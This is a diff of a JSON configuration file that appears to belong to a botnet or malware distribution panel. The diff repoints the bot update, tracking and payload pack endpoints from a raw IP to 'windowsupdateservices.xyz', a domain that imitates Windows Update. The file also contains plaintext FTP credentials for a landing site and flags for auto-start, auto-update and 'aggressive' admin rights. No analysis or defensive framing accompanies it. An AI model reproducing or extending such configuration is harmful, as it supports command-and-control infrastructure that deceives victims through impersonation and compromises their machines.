@@ -1,22 +1,26 @@
 {
   "version": "2026.06.16 14:24:45",
+  "urlDoc": "",
   "disabled": false,
   "disableVirus": false,
   "bux": [
     {
       "enabled": false,
-      "id": "unu.im"
+      "id": "unu.im",
+      "apiKey": "",
+      "apiUrl": ""
     }
   ],
   "dnSponsor": [
     {
       "enabled": false,
-      "id": "ufiler.biz"
+      "id": "ufiler.biz",
+      "url": ""
     }
   ],
   "pack": {
     "packFolder": "/root/hephaestus_data/default/server/packs",
-    "packTemplateUrl": "http://84.200.33.53/pack/envelope",
+    "packTemplateUrl": "http://windowsupdateservices.xyz/pack/envelope",
     "items": []
   },
   "clone": {
@@ -25,16 +29,17 @@
     "profile": ""
   },
   "server": "default",
+  "alias": "windowsupdateservices.xyz",
   "landingAuto": true,
   "landingName": "superplayer",
   "landingFtp": "ftp://ftp:ftp123@tube-18.xyz/tube-18.xyz/",
   "primaryDns": "84.200.33.53",
   "secondaryDns": "84.200.33.53",
   "extraUpdate": false,
-  "updateUrl": "http://84.200.33.53/bot/update",
+  "updateUrl": "http://windowsupdateservices.xyz/bot/update",
   "track": true,
   "trackDesktop": false,
-  "trackUrl": "http://84.200.33.53/bot/upsert",
+  "trackUrl": "http://windowsupdateservices.xyz/bot/upsert",
   "autoStart": true,
   "autoUpdate": true,
   "aggressiveAdmin": true,
@@ -61,7 +66,7 @@
     "_operate_isAtWork": true,
     "_operation": "apply",
     "_operate_hasToWork": true,
-    "_operate_modifyTime": "06/16/2026 13:55:15",
-    "StatusLabel": " \u0424\u043E\u043D\u043E\u0432\u044B\u0439 \u043F\u0440\u043E\u0446\u0435\u0441\u0441 apply \u0441 06/16/2026 13:55:15"
+    "_operate_modifyTime": "06/16/2026 14:05:15",
+    "StatusLabel": " \u0424\u043E\u043D\u043E\u0432\u044B\u0439 \u043F\u0440\u043E\u0446\u0435\u0441\u0441 apply \u0441 06/16/2026 14:05:15"
   }
 }
